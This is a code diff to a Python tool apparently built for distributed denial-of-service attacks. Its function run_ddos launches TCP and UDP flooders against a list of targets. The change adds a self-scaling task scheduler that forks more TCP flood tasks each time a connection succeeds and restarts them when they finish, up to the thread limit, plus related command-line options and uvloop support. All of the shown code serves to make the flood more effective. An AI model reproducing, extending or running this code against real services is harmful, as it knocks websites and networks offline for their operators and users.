@@ -3,6 +3,7 @@ import colorama; colorama.init()
 # @formatter:on
 import asyncio
 from asyncio import events
+from functools import partial
 import selectors
 import socket
 import sys
@@ -30,6 +31,80 @@ WINDOWS_WAKEUP_SECONDS = 0.5
 AsyncFlood = Union[AsyncTcpFlood, AsyncUdpFlood]
 
 
+class GeminoCurseTaskSet:
+
+    def __init__(
+        self,
+        loop,
+        runnables,
+        initial_capacity: int = 2,
+        max_capacity: int = 10_000,
+        fork_scale: int = 2,
+        failure_delay: int = 0.25
+    ):
+        self._loop = loop
+        self._tasks = runnables
+        self._initial_capacity = initial_capacity
+        self._max_capacity = max_capacity
+        self._fork_scale = fork_scale
+        self._pending = set()
+        self._failure_delay: float = failure_delay
+        self._shutdown_event = asyncio.Event()
+
+    def _on_connect(self, runnable, f):
+        try:
+            if f.result() and len(self) <= self._max_capacity - self._fork_scale:
+                for _ in range(self._fork_scale):
+                    self._launch(runnable)
+        except asyncio.TimeoutError:
+            pass
+        except Exception:
+            pass
+
+    def _on_finish(self, runnable, f):
+        self._pending.remove(f)
+        try:
+            f.result()
+        except asyncio.CancelledError as e:
+            return
+        else:
+            self._launch(runnable)
+
+    def __len__(self) -> int:
+        return len(self._pending)
+
+    def _launch(self, runnable) -> None:
+        if self._shutdown_event.is_set(): return
+        on_connect = self._loop.create_future()
+        on_connect.add_done_callback(partial(self._on_connect, runnable))
+        task = self._loop.create_task(runnable.run(on_connect))
+        task.add_done_callback(partial(self._on_finish, runnable))
+        self._pending.add(task)
+
+    async def loop(self) -> None:
+        # the algo:
+        # 1) for each runnable launch {initial_capacity} tasks
+        # 2) as soon as connection ready on any of them, fork runner
+        #    if max_capacity is enough
+        # 3) on finish, restart corresponding runner
+        #
+        # potential improvement: find a way to downscale
+        assert not self._shutdown_event.is_set(), "Can only be used once"
+        try:
+            for runnable in self._tasks:
+                for _ in range(self._initial_capacity):
+                    self._launch(runnable)
+            while not self._shutdown_event.is_set():
+                await asyncio.sleep(WINDOWS_WAKEUP_SECONDS)
+        except asyncio.CancelledError as e:
+            self._shutdown_event.set()
+            for task in self._pending:
+                task.cancel()
+            raise e
+
+
+# XXX: this is going to be used for UDP tasks only, maybe it's better
+#      to rename it properly
 class FloodTaskSet:
 
     def __init__(self, loop: asyncio.AbstractEventLoop, runnable: AsyncFlood, scale: int = 1):
@@ -75,6 +150,9 @@ async def run_ddos(
     table: bool,
     total_threads: int,
     use_my_ip: int,
+    initial_capacity: int,
+    fork_scale: int,
+    failure_delay: float,
 ):
     loop = asyncio.get_event_loop()
     statistics = {}
@@ -123,8 +201,11 @@ async def run_ddos(
         await asyncio.sleep(5)
 
     active_flooder_tasks = []
+    tcp_task_group = None 
 
     async def install_targets(targets):
+        nonlocal tcp_task_group
+
         # cancel running flooders
         if active_flooder_tasks:
             for task in active_flooder_tasks:
@@ -152,16 +233,22 @@ async def run_ddos(
             else:
                 logger.error(f"Unsupported scheme given: {target.url.scheme}")
 
-        num_tcp = len(tcp_flooders)
-        scale = max(1, (total_threads // num_tcp) if num_tcp > 0 else 0)
-
-        for flooder in tcp_flooders:
-            task = asyncio.create_task(FloodTaskSet(loop, flooder, scale).loop())
-            # XXX: add stats for running/cancelled tasks with add_done_callback
+        if tcp_flooders:
+            tcp_task_group = GeminoCurseTaskSet(
+                loop,
+                runnables=tcp_flooders,
+                initial_capacity=initial_capacity,
+                max_capacity=total_threads,
+                fork_scale=fork_scale,
+                failure_delay=failure_delay,
+            )
+            task = loop.create_task(tcp_task_group.loop())
             active_flooder_tasks.append(task)
+        else:
+            tcp_task_group = None
 
         for flooder in udp_flooders:
-            task = asyncio.create_task(FloodTaskSet(loop, flooder).loop())
+            task = loop.create_task(FloodTaskSet(loop, flooder).loop())
             active_flooder_tasks.append(task)
 
     try:
@@ -192,6 +279,8 @@ async def run_ddos(
                     None if targets_loader.age is None else reload_after - int(targets_loader.age),
                     passed > REFRESH_RATE * REFRESH_OVERTIME,
                 )
+                if tcp_task_group is not None:
+                    logger.info(f"Task group size: {len(tcp_task_group)}")
             finally:
                 cycle_start = time.perf_counter()
 
@@ -313,6 +402,9 @@ async def start(args, shutdown_event: Event):
         args.table,
         args.threads,
         use_my_ip,
+        args.scheduler_initial_capacity,
+        args.scheduler_fork_scale,
+        args.scheduler_failure_delay,
     )
     shutdown_event.set()
 
@@ -359,8 +451,10 @@ def _handle_uncaught_exception(loop: asyncio.AbstractEventLoop, context):
     logger.debug(f"Uncaught event loop exception: {error_message}")
 
 
-def _main(args, shutdown_event):
-    if WINDOWS:
+def _main(args, uvloop: bool, shutdown_event: Event) -> None:
+    if uvloop:
+        loop = events.new_event_loop()
+    elif WINDOWS:
         _patch_proactor_connection_lost()
         loop = asyncio.ProactorEventLoop()
         # This is to allow CTRL-C to be detected in a timely fashion,
@@ -379,9 +473,11 @@ def _main(args, shutdown_event):
 if __name__ == '__main__':
     args = init_argparse().parse_args()
 
+    uvloop = False
     if args.advanced_allow_uvloop:
         try:
             __import__("uvloop").install()
+            uvloop = True
             logger.info(
                 f"{cl.GREEN}'uvloop' успішно активований "
                 f"(підвищенна ефективність роботи з мережею){cl.RESET}")
@@ -395,7 +491,7 @@ if __name__ == '__main__':
     try:
         # run event loop in a separate thread to ensure the application
         # exists immediately after Ctrl+C
-        Thread(target=_main, args=(args, shutdown_event), daemon=True).start()
+        Thread(target=_main, args=(args, uvloop, shutdown_event), daemon=True).start()
         # we can do something smarter rather than waiting forever,
         # but as of now it's gonna be consistent with previous version
         while True:
